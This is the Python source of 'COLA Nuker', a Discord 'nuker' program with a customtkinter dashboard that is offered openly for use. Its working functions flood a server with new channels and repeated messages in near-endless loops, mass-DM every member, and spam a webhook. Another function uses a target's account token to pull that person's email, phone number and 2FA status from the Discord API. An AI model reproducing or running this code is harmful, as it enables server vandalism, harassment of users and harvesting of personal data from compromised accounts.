import os
import tkinter
import sys
from tkinter import messagebox, filedialog
import subprocess
import time
import random
from datetime import datetime
import string
from pathlib import Path
import requests
import shutil
import platform
from urllib.request import Request, urlopen
from time import sleep
import nextcord.ext
import nextcord
from nextcord.ext import commands
from customtkinter import *
import json
import customtkinter as customtkinter
from discord_webhook import DiscordWebhook, DiscordEmbed
def clear():
    os.system("cls")

def fchn():
    f = open(r"app\\token.txt", "r")
    bottk = f.read()
    f.close()
    bottkk = bottk.strip()
    print(f"""
    ===================================================================
    Bot: {bottkk}
    Command:       cola.spamchannels *name*
    ===================================================================
    """)
    intents = nextcord.Intents.all()
    bot = commands.Bot(command_prefix='cola.', intents=intents)
    @bot.command()
    async def spamchannels(ctx, namef=None):
        guild = ctx.message.guild
        if namef == None:
            namef = "cola-nuker"
        else:
            pass
        for i in range(99999999999):
            await guild.create_text_channel(name=f'{namef}')
    bot.run(bottkk)



def massdm():
    f = open(r"app\\token.txt", "r")
    bottk = f.read()
    f.close()
    bottkk = bottk.strip()
    print(f"""
    ===================================================================
    Bot: {bottkk}
    Command:       cola.massdm *message*

    NOTE: This will message all (possible) members on a server via dm
    ===================================================================
    """)
    intents = nextcord.Intents.all()
    bot = commands.Bot(command_prefix='cola.', intents=intents)
    @bot.command()
    async def massdm(ctx, namefx=None):
        if namefx == None:
            namefx = "Someone just MassDMed you with https://github.com/LuyaTools/cola-discord-nuker"
        else:
            pass
        for i in range(99999999999):
            members = ctx.guild.members
            for member in members:
                try:
                    await member.send(namefx)
                    print("[cola] +1 dm sent")
                
                except:
                    print("Could dm 1 user!")
    bot.run(bottkk)


def getin():
    os.system(r"cscript app\\tokeninfo.vbs")
    f = open(r"app\\target.token.txt", "r")
    tik = f.read()
    tikk = tik.strip()
    f.close()
    headr1 = {
    'Authorization': f'{tikk}',
    'Content-Type': 'application/json'
    }
    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headr1)
    if res.status_code == 200:
        print("")
        pass
    else:
        print("Token Invalid!")
        time.sleep(2)
        sys.exit()
    res_json = res.json()
    user = f'{res_json["username"]}#{res_json["discriminator"]}'
    uid = res_json['id']
    user_id = uid
    avatar_id = res_json['avatar']
    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
    pnum = res_json['phone']
    email = res_json['email']
    mfa_enabled = res_json['mfa_enabled']
    flags = res_json['flags']
    lang = res_json['locale']
    verified = res_json['verified']
    app2.withdraw()
    label = customtkinter.CTkLabel(master=app3, text=f"""
Token: {tikk}
Username: {user}
User-ID: {uid}
Avatar-ID: {avatar_id}
Avatar-URL: {avatar_url}
Phone-Number: {pnum}
Email: {email}
2FA: {mfa_enabled}
Flags: {flags}
Language: {lang}
Verified: {verified}
    """)
    label.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
    app3.mainloop()


def ddd():
    print("not released yet!")

def addtk():
    os.system(r"cscript app\\bot.vbs")
    f = open(r"app\\token.txt", "r")
    f.close()

def spweb():
    os.system(r"cscript app\\webhook.vbs")
    f = open(r"app\\webhook.url.txt", "r")
    webh = f.read()
    f.close()
    webhh = webh.strip()
    f = open(r"app\\webhook.txt.txt", "r")
    webt = f.read()
    f.close()
    webtt = webt.strip()

    for i in range(99999999):
        webhook = DiscordWebhook(url=webhh)
        embed = DiscordEmbed(title='', description=f'{webtt}')
        embed.set_footer(text='Spammed via COLA-NUKER - https://github.com/LuyaTools', icon_url='https://golfclub-isernhagen.de/wp-content/uploads/2018/09/coca-cola-logo-260x260.png')
        webhook.add_embed(embed)
        response = webhook.execute()


def spammm():
    f = open(r"app\\token.txt", "r")
    bottk = f.read()
    f.close()
    bottkk = bottk.strip()
    print(f"""
    ===================================================================
    Bot: {bottkk}
    Command:       cola.spammsg *message*
    ===================================================================
    """)
    intents = nextcord.Intents.all()
    bot = commands.Bot(command_prefix='cola.', intents=intents)
    @bot.command()
    async def spammsg(ctx, msg=None):
        if msg == None:
            await ctx.reply(message="`error: no message set`")
        else:
            pass
        for i in range(99999999999):
            await ctx.send(f"{msg}")
    bot.run(bottkk)

def home():
    app.withdraw()
    app2.iconbitmap("app\icon.ico")
    clear()
    panel.place(relx=0.15, rely=0.1, anchor=tkinter.CENTER)
    bel2 = customtkinter.CTkLabel(master=app2, text="COLA NUKER", text_color="#ff0000", font=('Calibri', 20))
    bel2.place(relx=0.5, rely=0.1, anchor=tkinter.CENTER)
    bel3 = customtkinter.CTkLabel(master=app2, text="https://blizz.cf/\nhttps://github.com/LuyaTools\nhttps://t.me/bladetools", text_color="#ffffff", font=('Calibri', 15))
    bel3.place(relx=0.5, rely=0.9, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam New Servers",
                                 command=ddd)
    button.place(relx=0.68, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Get Devices (IP, ...)",
                                 command=ddd)
    button.place(relx=0.86, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Change PFP",
                                 command=ddd)
    button.place(relx=0.68, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="No FriendRequests",
                                 command=ddd)
    button.place(relx=0.68, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="No DMs",
                                 command=ddd)
    button.place(relx=0.86, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Get Info",
                                 command=getin)
    button.place(relx=0.86, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Messages",
                                 command=spammm)
    button.place(relx=0.5, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="MassDM",
                                 command=massdm)
    button.place(relx=0.32, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Reactions",
                                 command=ddd)
    button.place(relx=0.32, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Status",
                                 command=ddd)
    button.place(relx=0.32, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Auto Login",
                                 command=ddd)
    button.place(relx=0.14, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="MassBlock",
                                 command=ddd)
    button.place(relx=0.14, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Webhooks",
                                 command=spweb)
    button.place(relx=0.14, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Channels",
                                 command=fchn)
    button.place(relx=0.5, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Settings",
                                 command=ddd)
    button.place(relx=0.5, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 hover_color="#ff0000",
                                 fg_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Add Bot Token",
                                 command=addtk)
    button.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)


    bel32 = customtkinter.CTkLabel(master=app2, text="More coming soon!", text_color="#ff0000", font=('Calibri', 40))
    bel32.place(relx=0.5, rely=0.7, anchor=tkinter.CENTER)

    app2.mainloop()

os.system("title Cola Nuker [LOG]")
os.system("color c")
app = customtkinter.CTk()
app.geometry(f"{600}x{500}")
app.resizable(width=False, height=False)
app.title("COLA Nuker")

app2 = customtkinter.CTk()
app2.resizable(width=False, height=False)
app2.geometry(f"{800}x{500}")
app2.title("COLA Nuker - Dashboard")

app3 = customtkinter.CTk()
app3.resizable(width=False, height=False)
app3.geometry(f"{800}x{500}")
app3.title("COLA Nuker - Tokeninfo")

customtkinter.set_appearance_mode("dark")

uun = "https://blizz.cf/tools/colanuker/version"
fxc = requests.get(uun)
fxct = fxc.text
ver = "1.0.1"


os.system("cls")
if fxct == ver:
    app.iconbitmap("app\icon.ico")
    clear()
    bel = customtkinter.CTkLabel(master=app, text="Thanks for using", text_color="#ffffff")
    bel.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
    bel2 = customtkinter.CTkLabel(master=app, text="COLA NUKER", text_color="#ff0000", font=('Calibri', 20))
    bel2.place(relx=0.5, rely=0.55, anchor=tkinter.CENTER)
    bel3 = customtkinter.CTkLabel(master=app, text="https://blizz.cf/\nhttps://github.com/LuyaTools\nhttps://t.me/bladetools", text_color="#ffffff", font=('Calibri', 15))
    bel3.place(relx=0.5, rely=0.8, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app,
                                 width=120,
                                 height=32,
                                 hover_color="#ff0000",
                                 fg_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Start Cola-Nuker",
                                 command=home)
    button.place(relx=0.5, rely=0.2, anchor=tkinter.CENTER)
    app.mainloop()
else:
    bel2 = customtkinter.CTkLabel(master=app, text="You are using an old version of COLA-NUKER!\nDownload the latest version here:\nhttps://blizz.cf/tools/colanuker/downloads.html")
    bel2.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
    app.mainloop()
